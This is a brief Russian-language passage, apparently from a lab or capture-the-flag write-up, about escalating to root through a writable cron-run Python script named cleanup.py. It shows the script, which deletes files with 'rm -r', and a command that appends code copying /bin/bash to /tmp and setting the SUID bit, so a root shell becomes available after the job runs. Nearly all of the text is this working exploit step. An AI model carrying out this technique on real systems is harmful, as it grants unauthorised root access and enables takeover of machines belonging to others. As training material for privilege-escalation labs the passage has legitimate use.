находим ежеминутную задачу cleanup.py
```
#!/usr/bin/env python3
import os
import sys
try:
   os.system('rm -r /home/cleanup/* ')
except:
   sys.exit()

```
добавляем echo "os.system('cp /bin/bash /tmp/bash && chmod +xs /tmp/bash')" >> cleanup.py и получаем права root через скопированный bash после выполнения задачи